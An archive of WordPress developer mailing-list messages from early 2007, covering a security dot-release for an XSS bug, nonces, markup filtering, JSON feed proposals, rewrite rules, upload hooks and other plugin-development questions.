Message-ID: <bb0886ed0702131727n5b2eee1dn6fe9389cdd32e81a@mail.gmail.com>

I think we need to do some dot releases to address the recent XSS bug
in wp_nonce_ays().   Betas of 2.0.9 and 2.1.1 are available on the
release archive page.

http://wordpress.org/download/release-archive/

We were about to officially announce 2.0.8, but we might as well hold
off and announce 2.0.9 instead.  The only change between 2.0.8 and
2.0.9 is the fix for the security bug.

2.1.1 contains several fixes since 2.1.  The fixes are conservative,
and they've been well exercised on wordpress.com and elsewhere.  I
think they are safe to leave in.

If there are any low-risk, high-impact bugs you think should go into
either of these releases, let's discuss their inclusion in this
thread.  Keep in mind that we need to turnaround these releases pretty
quickly, so we have to be careful what we include.  Everything else
should be deferred to 2.0.10 and 2.1.2.  See the milestones on trac.

I agree on both cases:

Per the HTTP RFC(s), GET requests are supposed to be idempotent.
Technically, this means that GETting a URL any number of times will
have identical side effects to getting it once.  In practice, this
usually means that GET requests have no long-standing side-effects.
If admin pages operate on a POST -> redirect -> GET pattern, then we
get several advantages:
 - A web browser's back/forward operations won't ever trigger a
duplicate action (since browser history skips over the redirected
POSTs)
 - A web browser won't prompt the user to re-submit POSTed data,
because no POSTed page ever produces output.

However, I don't know that this by itself will stop XSS attacks.  A
link could simply have a javascript action to create and submit an
arbitrary form as a post.  I do know there are a lot of places (see
http://trac.wordpress.org/ticket/3279) where Wordpress doesn't
properly escape its output, and every one of them is a potential
entrypoint for attacks.

We need to get a fix in for #3279, as it's a similar XSS issue.

Subject: [wp-hackers] 2.0.9 and 2.1.1

I think we need to do some dot releases to address the recent XSS bug
in wp_nonce_ays().   Betas of 2.0.9 and 2.1.1 are available on the
release archive page.

http://wordpress.org/download/release-archive/

We were about to officially announce 2.0.8, but we might as well hold
off and announce 2.0.9 instead.  The only change between 2.0.8 and
2.0.9 is the fix for the security bug.

2.1.1 contains several fixes since 2.1.  The fixes are conservative,
and they've been well exercised on wordpress.com and elsewhere.  I
think they are safe to leave in.

If there are any low-risk, high-impact bugs you think should go into
either of these releases, let's discuss their inclusion in this
thread.  Keep in mind that we need to turnaround these releases pretty
quickly, so we have to be careful what we include.  Everything else
should be deferred to 2.0.10 and 2.1.2.  See the milestones on trac.

http://trac.wordpress.org/milestone/2.0.9
http://trac.wordpress.org/milestone/2.1.1

kses isn't meant to be performing any of these tasks it has one job and

attacks.

If we want to improve the tag balancing then lets do that.

But as matt said kses has done us well and is doing the job we want it to
do fine.

For me tag balancing (balance_tags) and tag filtering (kses) are two
separate processes - and you don't always want both.

I do think we need super correctly (x)html purification in the core either
to me it is the perfect job for a plugin - if people want it they can
install it.

Producing conformant markup should be core functionality for WordPress
because it purports to have a focus on "web standards".

"super correctly" implies that you can have partially correct XML, but
XML is either well-formed or it isn't. There's no twilight zone.

And of course, now it's running smoothly.

Without expressing an opinion on the should we/shouldn't we debate, I
will point out that there is a lot more to XHTML than well-formed XML.
That is merely the foundation.

For example if we were to use XHTML strict,
  <center>some text</center>
is perfectly formed XML. But it is not allowed in strict XHTML

It's possible that Akismet recently flagged a good comment as spam; that

saw it. It doesn't seem to be in the most recent 150 spams that Akismet 
shows me.

How do I search/scan the next 3000 or so comments that Akismet has 
flagged to see if the comment is in there? This should be simple, but if 
there's a button to do it. I don't see where.

Use the most recent version of the plugin from Akismet.com  It has  
paging and search capabilities.

That's an interesting view. Could you tell me when you would only do tag
filtering and not tag balancing? Tag balancing is crucial, because
otherwise an attacker could totally mess up a layout by </div>ing out of
the box they're in.

The trouble with that is the average Joe, who doesn't really care about
standards-compliance and just wants things to work, won't ever do such a
thing. I think WordPress should put itself to a higher standard and
attempt to have 100% compliant code out of the box.

HTML Purifier's already got it covered: that will become <div
style="text-align:center">some text</div>. You can try it:

That's correct. Also remember that cache accelerators, which preload
links on a page, won't accidently trigger actions.

JavaScript can cause an arbitrary GET/POST request on any page on the
web. Nonces effectively guard against them though, because due to
same-domain restrictions there's no way for the malicious code to find
out the nonce unless their on the same domain.

It would be really cool if WordPress had a framework that automatically
did noncing for you for all core actions. And, of course, XSS is always
a problem too (though, most of the time, fixing that is just adding an
appropriate htmlspecialchars().

Should it just be 2.0.8.1 then?

Thanks again. All working well. One comment... it would be useful to  
have a non-echoing version. I got around it by using wp_create_nonce  
(and the referrer code) directly so it's not major, but it wold be  
useful not to have to do that.

Agreed. In fact, it's *much* easier to do tag filtering if you do it 
after making the document well-formed. There are just fewer places to 
hide something. Enhanced security is an often unrecognized benefit of XML.

I assume you meant "don't" above. By contrast. I think WordPress should 
guarantee well-formed XHTML without any extra configuration. This is a 
technical decision the benefits of which will not be obvious to a 
non-developer, such as most WordPress users. Tolls like WordPress 
succeed precisely because they hide details like this from their users.

Obviously on this list people are more savvy about the underlying markup 
issues, but a typical end user shouldn't have to concern themselves with 
this.

Yes, but it is the foundation; it is the place to start; and it is the 
minimum we should provide.

That depends on the meaning of "allowed". That fragment is well-formed 
but is not valid. Valid is much harder and I think we can live without 
it. However well-formed is a reasonable and useful goal.

Note entirely related to this thread but I thought it might be a good
time to make my first post to this list and mention a bug report I filed
that's related to XHTML validation.

Perhaps you could create a plugin to do this, as a proof-of-concept,  
and we can all see how it actually works.

Making skins well-formed is the responsibility of the skin author, not
an HTML filter. As for a plugin for blog posts, see:

http://comox.textdrive.com/pipermail/wp-hackers/2007-February/010664.html

Once again, I'm soliciting comments: I want to know that it works
reasonably well and plays with other plugins before I package it into
the HTML Purifier plugins/ directory.

HTML Purifier could be similarly applied to blog comments and other HTML
content, but the plugin doesn't do that yet. It would also be really
nice if the original HTML was preserved, and the purified HTML was
cached in the filtered column, but I don't know how to do that either.
Plus it might collide with the Preformatted plugin.

G'day,

I've searched the online forums, read through the code of xmlrpc.php, 
and I still can't find a solution to this. According to a post on the 
forum, an application called Photon can create new categories in 
WordPress via the API.
http://wordpress.org/support/topic/21721

I have a script that retrieves the list of categories and submits new 
posts via the API, but I can't find a way to create new categories. Can 
anyone offer any suggestions?

Cheers,


Callum.

It's probably by using the new WordPress API.  I asked in another
thread if there was any docs on it but never heard any followup.  I
echo this request because I would like to pass it along to the creator
of Blogdeskk and see if he would work in support for the API.  Support
for Pages and Category work via XMLRPC comes up in the wp.com forums
on occasion.

There's no doc as yet, but a quick look through xmlrpc.php reveals much.

The list of new functions starts on line 72.

http://trac.wordpress.org/browser/trunk/xmlrpc.php?rev=4874#L72

The page struct is on line 215.

http://trac.wordpress.org/browser/trunk/xmlrpc.php?rev=4874#L215

The category struct is on 498.

http://trac.wordpress.org/browser/trunk/xmlrpc.php?rev=4874#L498

Make sure there is a WordPress API entry in the RSD for the site
before using the new API.

Message-ID: <45D4B28A.40602@metalab.unc.edu>

Lately I've run into a problem where the WP comments script causes false 
positives when validating. This is the wp-comments-post.php script.

When you load it via GET you receive something like this:

Date: Thu, 15 Feb 2007 19:04:27 GMT
Server: Apache/2
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Last-Modified: Thu, 15 Feb 2007 19:04:27 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
content-style-type: text/css
Content-Length: 0
Keep-Alive: timeout=15, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

200 OK

I think this script should be returning an HTTP 405 Method Not Allowed 
error instead when accessed via GET.

Also, what's with that expires header? 1984? That seems to be the case 
on all the WP pages I've checked. WordPress 2.0.8 if that makes a 
difference to any of this.

I note another problem with this header. It claims to be sending 
text/html but the empty method body is not a legal HTML document. 
(That's probably why my validator is flagging it.) The Content-type 
should perhaps be text/plain instead of text/html if it's not changed to 
an error code.

OK, I'll decloak. ;-)

>I'm an idiot though.  What's the RSD?

RSD stands for "Really Simple Discovery" and is a method for blogging
clients to discover additional information about the API method to use
to interact with a given blog... This is how you are able to tell a
blogging tool just 3 items: a blog URL, a username, and a password, and
it can determine which API to use (MT, Metaweblog, Blogger, WordPress,
etc.) to communicate with your blog.

It works like this:

First, The blogging client parses the HTML HEAD area of a blog looking
for the RSD link, it might look like this:

<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://
photomatt.net/blog/xmlrpc.php?rsd" />

Next, the tool goes and fetches that URL, and would see something like this:

<?xml version="1.0" encoding="utf-8"?><rsd version="1.0" xmlns="http://
archipelago.phrasewise.com/rsd">
  <service>
    <engineName>WordPress</engineName>
    <engineLink>http://wordpress.org/</engineLink>
    <homePageLink>http://photomatt.net</homePageLink>
    <apis>
      <api name="WordPress" blogID="1" preferred="false" apiLink="http://
photomatt.net/xmlrpc.php" />
      <api name="Movable Type" blogID="1" preferred="true"
apiLink="http://photomatt.net/xmlrpc.php" />

      <api name="MetaWeblog" blogID="1" preferred="false"
apiLink="http://photomatt.net/xmlrpc.php" />
      <api name="Blogger" blogID="1" preferred="false" apiLink="http://
photomatt.net/xmlrpc.php" />
    </apis>
  </service>
</rsd>

This bit of HTML tells the client that it can speak 4 APIs, but prefers
the Movable Type API and tells the tool where the XML-RPC URL is and
what the Blog ID number of this blog is (required to interact with the
blog via the API).

The whole process saves end users considerable setup time, they don't
need to know their API endpoint or their Blog ID or even what kind of
API their blog uses.

So to get back to the "Make sure there is a WordPress API entry in the
RSD for the site" statement, if there is no entry in the RSD file, then
blogging clients and tools would assume that your blog does not support
the use of the WordPress API. Clients would not be able to "discover"
that the Wordpress API was supported on your blog.

Sending an expires header with a date in the past can help to ensure
that the browser does not cache the page. Particularly important for
some browsers that might not support (or ignore or misinterpret) the
Cache-Control or Pragma headers... The headers you posted would be very
indicative of an app developer who is using a variety of ways to ensure
that the page is not cached by the browser.

In themes, you can add wp_meta() inside of the <head> and it will add it
for you.

It's actually wp_head(), but that's the right idea. :)

I've raised ticket 3797 ( http://trac.wordpress.org/ticket/3797 ) to
address this. I've added patches for all three current development
streams.

That issue is not really about browser quirks, but about the fact that
the specification for non-caching instructions changed from http 1.0
to http 1.1. And that many http 1.0 implementations (not just
browsers) were a little woolly about the standards.

In my experience, the biggest problem now is in proxies and
transparent caches, there are still ones around which don't understand
the http 1.1 headers.

Thus, what wordpress does is perfectly valid and correct: it uses all
the http 1.0 and 1.1 no-cache headers and hints.

Subject: [wp-hackers] JSON Syndication
Message-ID: <C0FB55C3-DCB8-494F-813F-34C4EEE715E4@mattpat.net>

Hey there,

For more than a year now, I've been developing my own content  
management system called Tux CMS (http://blogwithtux.org), which  
takes a lot of its feature ideas and concepts from WordPress (I've  
also ported a few WP themes over to it). Extremely little borrowed  
code, but a lot of borrowed inspiration, so first of all, I'd like to  
say thanks to the WordPress team for an awesome product! :)

Second, though, I would like to suggest a feature. For the past few  
months I've been getting fed up with XML, and getting to know JSON.  
XML can be quite clunky, and really isn't suited for syndication when  
you think about it. JSON, on the other hand, is a very lightweight  
data serialization language, which greatly improves size and  
simplicity of use of syndicated content (it has direct relationships  
to programming structures, so it's easier to access programmatically  
than XML through the DOM).

I'm trying to get a movement going of a syndication format made  
completely in JSON. The first step, I figured, was to develop an  
informal specification: http://howto.blogwithtux.org/index.php? 
title=JSON_feed.

The next step was to create a working implementation of my  
specification: http://www.mattpat.net/json.php. But then, when trying  
to decide on the third step, I wondered, hmm, what would get this the  
most exposure? Why, implementation by one of the best and most widely  
used blogging engines, of course! I'm a big fan of WordPress (despite  
the fact that I write my own CMS... of course, it's open source, so I  
would call it more friendly competition), so I thought I might start  
here.

Is this something WordPress developers might be interested in? I want  
to make this a large movement... I even wrote an article on A List  
Apart for it (still waiting for a response on it).

Let me know!

Matt Patenaude

More to the point I would rather clients be allowed to cache my pages. 
My site's slow enough as is and it's not like I change them all that 
often. Is there a way I can configure this short of hacking on the 
source code?

You don't want wp-comments-post.php cached, usually. If the header's on the
rest of the site (blog posts, etc.) then it's a problem.

Greets:

I'm hoping that this was the list where we were discussing it a few
weeks ago but we were talking about the missing "Mark it as spam" link
within the email notice that one gets when someone gets a comment left
on their blog.

Do note that this link is missing from tracbacks.  Having discovered
yet another splog scrapper who copied over a couple dozen posts just
this morning and linked back to my site, putting it in there as well
may be a good idea.

Seems like something that should be there. If you could raise a ticket (
trac.wordpress.org) regarding this issue, that'd be great.

It is. This is from my main index page for example:

To the best of my recollection I haven't changed or configured anything 
to explicitly request this.

I do not see this on other, non-WordPress static files from the same 
site in different non-Wordpress controlled directories.

It's a neat idea, but I have two problems with it:

1. It's too late. There's already a format war between Atom and RSS,
not to mention podcasting enclosures, GeoRSS, and everything else.

2. The #1 thing that makes JSON cool and useful is the &callback=x
parameter, which allows it to be called cross-domain using dynamic
script tags. As an example, see how Google's geocoder works:

http://maps.google.com/maps/geo?output=json&callback=dostuff

However, it be disasterously irresponsible to implement something like
this in Wordpress and encourage people to use it. It's an open
invitation to run arbitrary JavaScript on random domains, a weakness
that XML simply does not have.

At any rate, the first step in this process would be to develop the
feed as a plugin, and demonstrate that it offers something not
available in existing syndication schemes. If this were truly the
case, then perhaps the leet hax0rs would consider adding it to the
core, down the road.

Message-ID: <1171647904.5882.27.camel@localhost>

Hello 2 all,
        I have a problem with some blogs and at the same time, I haven't
with others (differents vhosts in the same webserver, more in the same
vhost WP 2.1 in document root is rendering blank pages to proxies
clients (squid) while another installation a /subdir is pretty working).

The problem came after upgrading WP 2.1a3 to stable, and
after upgrading to php 5.2.1

Some hint? I've tried to remove squid cache to my personal proxy but
it's still blanking. Also from office, so I don't see the proxy as
problemattic.

Curious to understand... Is there going to be a security update in the next

of any imminent update on the roadmap.

If you really need a better cache solution than the one already
included in the core, then you can try WP-Cache
(http://mnm.uib.es/gallir/posts/2007/01/31/963/).

Thanks for the responses guys! Couple of points I'd like to bring up.

Awesome stuff, man! This was just what I was looking at.

Well, as for content-type, application/json is the MIME-type  
specified by the JSON spec, but I'd imagine our own feed format would  
take its own content-type (for example, Atom is application/atom+xml,  
not just application/xml)... maybe application/feed+json, or  
something similar? It would all depend on how mature the  
specification became.

As for escaping, I handle it on my website by using a JSON library:  
http://tuxcms.cvs.sourceforge.net/tuxcms/tuxcms/json.php?view=markup

Note how, in the above file, my entire feed is constructed using PHP  
data structures, and then one line converts it into the JSON feed.  
Cool, huh? :)

True, but in my opinion, they both have the fundamental problem of  
using complex XML. I'm not saying by any means to replace XML feeds  
by JSON feeds, but JSON feeds are definitely the new movement.  
Del.icio.us and Yahoo! have both started offering their web service  
outputs in JSON in addition to XML, because it's so simple to use  
with almost any programming language (which is largely the goal of  
any syndicated content). Every movement has to start somewhere, and  
in computers, I don't think there such a thing as too late. (OK, yes  
there is, but I don't think this is an instant of it :P).

Well, callbacks might be cool, but I don't think they're the #1 thing  
that makes JSON cool-- I'd say it's the fact that it's simple,  
lightweight, and supported almost everywhere.

FIrst of all, callbacks wouldn't have to necessarily be implemented  
by WordPress. In fact, I don't even think there is much use for a  
feed specification. If the format caught on, it would probably be  
included using a link element, not a script element. Besides, the  
inclusion would be done by a plug-in, so we would control how it was  
included on the page. The plug-in would allow for the syndication of  
JSON, not necessarily its use on a web page.

Also, note the above implementation's (by Jeff Minard) use of  
callback (pass a random callback to the first URL). No matter what  
you pass, it wraps the feed in wp_jason_feed(eval()). This would  
provide a little extra control for feeds used on other WordPress sites.

Anyway, you both said the best way to go is to make a plug-in, and I  
think I'll do just that. Thanks for the help!

Message-ID: <9022045.post@talk.nabble.com>


Hi everybody.

My name is Andrea and I have a WordPress blog about programming, and this is
my first incursion into this list.
A little wp-bio: I contributed a plugin called Enzymes, for making it easier
to move around custom field values. I use it extensively for posting code
snippets.

Recently I posted an article
(http://www.mondotondo.com/aercolino/noteslog/?p=131) about a possible
restyling of the custom fields section. I implemented it on my local
installation and posted pictures. 
I'd like to receive some feedback and to know if you think you could 'steal'
it for the next release.

Bye,
--Andrea

Subject: [wp-hackers] two plugins hacking the query,
	ne'er the two shall meet...
Message-ID: <45D73EEC.6070006@comcast.net>

I have two really simplistic plugins I've made, both take control of the 
wp query in different ways, but both use fields from the postmeta table 
to do their work. Needless to say, they have a conflict!

Plugin #1 uses one postmeta field to order-by the end results of the 
query (by a user-specified rating/priority).
Plugin #2 uses a different postmeta field as part of a query match/WHERE 
clause to filter results.  (Search plugin...)

The issues are:
- both want to set up a LEFT JOIN on the postmeta table (which I could 
sort of workaround... but not quite...)
- bc plugin #1 was JOINing on a particular named field, and then just 
assuming it could ORDER BY postmeta.value (bc there was originally only 
every one pm value in the result!), adding another postmeta field to the 
query borks the ORDER BY ability.

Anyone good with wp/mySQL queries at this complexity level?  My gut 
instinct says I either need to join on all postmeta's for the given 
post, but somehow 'alias' the particular named field for the ORDER BY 
(I've yet to see that this can be done), or might need to rework the 
ordering plugin somehow (post-query sorting doesn't work with LIMIT 
paging through results, so that screws me up...).  At the moment, I 
disable the ordering override when doing Searches, so the search gets 
the custom results, just not ordered properly.

Thanks all!

Subject: [wp-hackers] WP 2.1 static home page issues
Message-ID: <EDA882C9-9331-44BB-BC7A-FC727D8B2B69@gmail.com>

I've noticed a vary weird behavior with WordPress 2.1 and static pages:

1. is_home() returns false when displaying the static home page, and  
returns true when displaying the inner page designated as the blog page.

2. The home page, showing static content, shows the page name in the  
title when calling wp_title(), which is an inner page behavior. to  
make things weirder, the inner page used for the blog page shows, it  
doesn't show a title.

3. Don't you guys think there should be a way to auto exclude the  
page set as home from wp_list_pages, so that people downloading  
public themes and decide to set up a static home page don't need to  
try an edit the exclude case themselves. or in my case, my clients  
wont need to tell me the ID for the page they will use as a home page.

4. I also think that  settings for the static home page are quite out  
of place in the 'reading' tab in the WP admin.

Any thoughts?

See #3682: is_home() returns FALSE when using a static page as your
front page, should return TRUE
http://trac.wordpress.org/ticket/3682
which is closed WONTFIX.

Your other numbered items are excellent discussion points, but I
personally don't have strong opinion on this area of functionality.

Cheers,
Lloyd

I'm not a WP developer, and not familiar with the trac system, but I  
really think this should be changed. Is it OK to discuss it here?
Although is_home() is sometimes used to add things to the sidebar on  
the main blog page, that is a secondary use imo, and maybe a new tag  
is_blog() should be created.
The front page of a site is often unique, and needs unique settings,  
wether showing a blog or static information.

Personally, I think we should fix that.  is_home() was intended to
always track the front page and that's how most people use it.

2 and 3 should go in trac.  Those would be good fixes.

For 4, I think the reading page is the best location among the
existing options pages.  I don't know if creating a new page for them
is worth it.

This is the behavior of my static home-page plugin--it makes is_home()
return true on the front page--and by far the number one question I've
had is how to correct messed-up themes.  What happens is that many
popular themes get really confused when is_home() is true but isn't
showing the latest group of posts.

So I would caution against moving away from the 2.1 implementation.
It is slightly annoying that is_home() is not really the "home," but
that's an annoyance that will concern mainly coders as opposed to
ordinary users who will be the ones annoyed when their themes don't
work with a static home page.

Don't change a ticket to "fixed"; only one of the lead devs can do
that after they apply the patch.

I'm not sure if you noticed, but that message was spam. The same person
posted similar messages to other threads. Please try not to respond to spam,
as it just increases noise in deference to the signal.

Hi,

If you wish to see a dependencies chart (or function call chart), then  
you'll probably need to generate one yourself, using a PHP flow  
analysis tool. It could, however, be rather complex. I suggest that  
you learn the functions and files, as documented in the Codex,  
starting with the core files and going 'outwards'. This way you will  
get a feel for what's going on 'under the hood' (WordPress anatomy).  
You will know which file/function does what. Beyond this, I am not  
entirely sure what to suggest, but I advise that you do intra-file  
search using tools like GNUrep to identify code of interest. You could  
alternatively search the Codex for particular bits of the code. There  
is some description there about the structure/hierarchy, which is  
probably the most you can get.

As code evolves over time, there's nothing that beats experience and  
once you stop hacking, you'll forget variable names, function names,  
and find them removed, renamed, or relocated.

I hope this helps a little...

IMO Leaving it the way it is makes it harder for theme developers to  
plan for the possible use of a static home page. at least create a  
different function that lets you know if you are on the "real" home page

Hi Ryan,

Thanks for the links, yes, the WordPress API is clearly the way to go.

However, as of downloading the latest version wordpress.org, the 
xmlrpc.php file does not include any of these functions.

Does anyone know when these changes will make it to a production release?

Cheers,


Callum.

A plugin (wp-cache-headers) that sent proper last-modified and such for 
every page in WP (it could use the same hooks wp-cache does) would be 
pretty cool. If you put it behind a reverse proxy you could have 
something just like wp-cache but even faster.

The headers you noticed on the comments file is from this line:

nocache_headers();

Which we use occasionally in WP in places that should never be cached by 
clients.

G'day,

http://wp-plugins.net/plugin/mEBuyYouADrink/#plugin_1621
All the download links I can find for the MeBuyYouaDrink plugin lead 
back to markus-steinhauer.de which seems to be down at the moment.

Does anyone have a copy of this plugin? I believe it's released under 
the GPL, so there should be no licensing problem with sending me a copy 
if somebody could. I'll also post it on my own site in case the author's 
site remains down for some time.

Hi Andrew,

That's fantastic, thanks a million. I tried searching for it but 
couldn't find anything, very, very much appreciated.

It is GPL licensed so I'll make it available for download on my server.

Cheers,


Callum.

Hello all:
I need to embed a gallery into my WP Site... actually, I just need how to
find the proper file to edit. I'm a WP newbie, as you see.

Can somebody guide me to the light, please? My brain is all cracked up, now.
I've tried the WPG2 plugin, but  it breaks the layout of my template... any
ideas?

Thanks for reading.
CYa!

I found that I needed to right my own Gallery template to match the
Wordpress one to make it work.

Subject: [wp-hackers] Creating custom rewrite rules
Message-ID: <45D92F7A.7030801@callum-macdonald.com>

G'day,

Does anyone have a copy of the Custom Rewrite Rules plugin? The download 
link is dead.
http://wp-plugins.net/plugin/custom_rewrite_rules/

If not, I'm reading the WP_Rewrite function reference on codex:
http://codex.wordpress.org/Function_Reference/WP_Rewrite

and using the FeedDirector plugin as a starting point:
http://boren.nu/archives/2005/03/29/feed-director-plugin/

I'd like to add some custom rewrite rules to redirect 
/directory/pagename.htm to page_id = 2. Does that make sense? So 
siteurl.com/directory/pagename.htm will load the page with page_id 2 in 
WordPress.

I've tried this code (modified from the Feed Director plugin:
function feed_dir_rewrite($wp_rewrite) {
    $feed_rules = array(
        'index.rdf' => 'index.php?feed=rdf',
        'index.xml' => 'index.php?feed=rss2',
        'test.htm' => 'index.php&page_id=2',
        '(.+).xml' => 'index.php?feed=' . $wp_rewrite->preg_index(1)
        );

        $wp_rewrite->rules = $feed_rules + $wp_rewrite->rules;
}

The index.rdf and index.xml links work, but my test.htm link doesn't for 
some reason. Can anyone offer any suggestions?

Cheers,


Callum.

(Probably a question that belongs on the WP support forums, or even the WPG2

But, have a look at this:

That fixes most layout borkage.

Message-ID: <A2A548FF-B622-49ED-A54E-992571C3DDD0@pixline.net>


Hi everybody,
this is my first - and hope not the last - post in this mailing  
list,  so I beg your pardon if I ask for something already asked, but  
I can't find nothing useful to me. Please excuse my awful english  
too :-)

I'm working to port a complex website (with its own hand-made CMS) to  
wordpress, and I've managed to emulate nearly every feature it has  
with a bunch of plugins, except two or three of them, and I'm trying  
to convert my legacy code into a new plugin.
On the actual CMS we had a function to sanitize the file names and  
manipulate uploaded files (like stripping spaces and not allowed  
chars, converting all lowercase, and filling mp3 idv2 tags with the  
post meta data); I'd love to port that function to wordpress, but I  
can't find any hook to plug it with.

There is a way to hook or append some code on the file uploading, or  
I need to hack inline-uploading directly?

Really thanks for your time, I'll keep on googling anyway in the mean  
time.

There is an action called 'upload_files_upload', which is called from 
upload.php for file upload management. You should be able to add to 
that, using add_action, with a high priority so your function is 
called first. See upload-functions.php in wp-admin for information on 
what it is doing now... if you have been writing plugins, this is 
probably enough to get you started?

Hope this helps --

Subject: [wp-hackers] Search plugin and problem with paged searches in WP 2.1
Message-ID: <1171903738.6599.45.camel@localhost>

Hello everybody,

I maintain the plugin AdvancedSearch which provides a boolean search and
a couple of other features. I now have a really heavy problem with
WordPress 2.1 and paged search results. (You'll find the main file of
latest release at http://pastebin.ca/363672 and the entire plugin at
http://www.zirona.com/software/wordpress-advanced-search.)

The plugin was first designed for WP 2.0.x and it inserts an own SQL
query via the posts_request filter. In WP 2.0.x, I could simply set the
range of post to fetch from the db with LIMIT (the LIMIT being
calculated from $wp_query->query_vars['paged'] and the results per page
entered by the user). Paged searches worked perfectly, although I have
to admit that I don't know how WordPress determined if there were more
posts before or after. Now, in WP 2.1, this doesn't work anymore; it
either doesn't display the before/after links anymore, or it always
loops on the same page.

I'm totally stuck and I would really apprechiate if somebody had an idea
on what I would have to change or where I have to search in order to get
the paged comments working in WP 2.1 again. The relevant parts for the
query construction are in the function ctas_queryfilter, ll. 375-501,
the actual query is in ll. 465-497. I'm thankful for any hint; if
something isn't clear, I'll be glad to answer any questions.


Best regards,
Alex

I call shenanigans on this. XML is exactly suited for serialization, and 
JSON isn't. You cannot easily pass syndication feeds in simple 
name-value maps. There's too much structure there that you lose when 
doing that. If what you have is a name-value map, then JSON may be 
simpler. Syndication data is not made up of name-value pairs though.

The problems RSS had were the result of avoiding XML and trying to make 
it more like JSON. We've been down that road already. It didn't work. 
That's why there's now Atom.

Well I certainly wouldn't suggest anybody use the DOM, but there are 
alternatives. The problem is DOM, not XML. Try XQuery, XSLT, XPath, or 
XOM to name just a few.

The syndication format I see there is much simpler than what people are 
sending today with Atom. It is essentially a variation of the original 
RSS specs which were massively oversimple for the use case, resulting in 
truly ugly hacks to account for things people needed to do that RSS 
couldn't. Please consider the needs of full text feeds with embedded 
markup. Once you do that JSON's no longer so simple.

And I'm not even talking about the inevitable security bugs that are 
going to open up if people begin executing JavaScript code that 
syndicators send them.

Yeah, I think he's probably confusing a particular schema with XML.  Well, at least a plug-in is a good way to create a solution-in-search-of-a-problem exercise coming several years too late to be meaningful.

Do you or anyone know any plugin or code that trigger that hook? I'm  
just stuck on how to play with that action, I'm pretty good at  
editing, but I lack experience on writing... anyway I'll try to make  
my thing.
Thanks for your tip.

Your query needs to have SQL_CALC_FOUND_ROWS at the beginning.  That
does the counting. Also, don't check for a post_status of static
anymore.  Check for a post_type of 'page' to get pages and 'post' to
get posts. post_date_gmt <= current time is no longer needed to
exclude future posts.  Future posts now have a post_status of
'future'.

Copying both lists this time, hopefully.

We need to release 2.0.9 and 2.1.1 soon.  Any feedback we can get
today is appreciated.

Release candidates are available at the release archive.

 http://wordpress.org/download/release-archive/

#3781 is the motivator for these releases.  Some other fixes also went
in.  In addition to the 2.0.8 changes that we never got around to
announcing, 2.0.9 fixes #3781 and #3574.

2.0.8 changes:

http://trac.wordpress.org/query?status=closed&resolution=fixed&milestone=2.0.8

2.0.9 changes:

http://trac.wordpress.org/query?status=closed&resolution=fixed&milestone=2.0.9

2.1.1 has a handful of fixes.  A few particularly annoying bugs were dispatched.

http://trac.wordpress.org/query?status=closed&resolution=fixed&milestone=2.1.1

Try out 2.0.9 and/or 2.1.1 and let us know how it goes.

Subject: [wp-hackers] XHTML 1.1 validity of themes not possible in WP 2.1
Message-ID: <795977f50702192258g1909546flac035e6afc289133@mail.gmail.com>

Trying to keep my blog system state of the art I tried to tune the
default WP 2.1 theme to get it XTHML 1.1 valid. I was a little bit
disappointed as I have recognized that it was not possible without
changing some of the files in /wp-includes. To spare the investigation
of the issues causing the XHTML 1.1 incompatibility I have decided to
post them to this mailing list. So any of the devs read this posting
could fix the issues easily.

There are two issues that make it impossible to create XHTML 1.1
conform themes in WP 2.1:

1. wp-includes/general-template.php:918 (line)

In XHTML 1.1 the html element and other elements have no "lang"
attribute. This attribute has been replaced by the "xml:lang"
attribute.

2. wp-includes/classes.php:514 and/or
wp-includes/template-functions-post.php:427

Under certain circumstances the $css_class variable is empty which can
be observed in the XHTML source code in the comments section. The
consequence is an empty li class "<li class="" id="comment-3">" which
is not W3C conform for XHTML 1.1 as well.

I have wrote a blog entry describing these issues precisely:
http://blog.loxal.net/accomplishedtech/w3c-conformity-valid-xhtml-10-strict-and-css/

Thank you very much, Ryan! This perfectly solved the problem. :)

Yes, I know. In the current development version I already took care of
this. But I didn't want to post that one in order to avoid confusion.

After some time spent on the upload-functions.php, I've discovered  
that wp_upload_tab_upload_action() calls wp_handle_upload() - in  
admin-functions.php - passing an array called "$overrides", and I've  
learned how to pass my function:

	$overrides = array 
('action'=>'upload','unique_filename_callback'=>'my_function');

so, the raw stub of the plugin is actually a clone of the  
wp_upload_tab_upload_action() function, enabled by:

	remove_action( 'upload_files_upload', 'wp_upload_tab_upload_action' );
	add_action( 'upload_files_upload', 'gmz_upload');

I just don't know if this is an accettable way to procede for a  
plugin. Can you confirm or correct me, please?
Draft source code available on request.

Thank you hackers!

Message-ID: <871593.70861.qm@web54107.mail.yahoo.com>

Hi
  How can I use $wp_rewrite->mod_rewrite_rules()  in the wordpress I've with me. 
  I've written the following code along with your rules
   $rules .= "RewriteRule ^/wp-content/([^/]+)$ /wp-content/index.php\n";
  for my wordpress so that anybody accessing anything in wp-content should return to index.php instead of 404 error. But it seems not to be working.
   
  Can somebody give some deeper insights wp_rewrite class
   
  Thanks

Subject: [wp-hackers] about a possible bug related to attribute_escape
Message-ID: <9069531.post@talk.nabble.com>


attribute_escape's declaration (includes/formatting:1102)


// Escaping for HTML attributes
function attribute_escape($text) {
  $safe_text = wp_specialchars($text, true);
  return apply_filters('attribute_escape', $safe_text, $text);
}


attribute_escape's use I'm talking about: (admin/admin-functions:942)


$entry['meta_value'] = attribute_escape($entry['meta_value']);


I think there is a bug with respect to this use.

If I insert an html entity like &# 8212; into a custom field value (I'm
escaping with a space now), then it is recorded as &# 8212; but when that
value is read back, attribute_escape will display it as the corresponding
char (&#8212;). Now, if I update that custom field without changing
anything, I'd expect that the recorded value will still be &# 8212; but it
will be something completely different and garbage-like (???). From now on,
the recorded value will be ??? and the displayed value will be ?, no matter
how many times I keep updating it.

The problem is that I really want the chars exactly as I put them into a
custom field, i.e. if I put &# 8212; then I want &# 8212; recorded and
displayed (in the editing panel): I don't mean at all &#8212; nor ??? !! 

This is true not only for meta_value, but also for meta_key, and not only
for &# 8212; but also for any other entities / chars.

WordPress should not change the values of the custom fields because they are
the last resort for keeping data as is, untexturized.

I've tried the following and it works as expected (by me)


$entry['meta_value'] = htmlspecialchars($entry['meta_value']);


What do you think?
Is it a bug?

G'day,

Does anyone have a copy of the Custom Rewrite Rules plugin? The download 
link is dead.
http://wp-plugins.net/plugin/custom_rewrite_rules/

If not, I'm reading the WP_Rewrite function reference on codex:
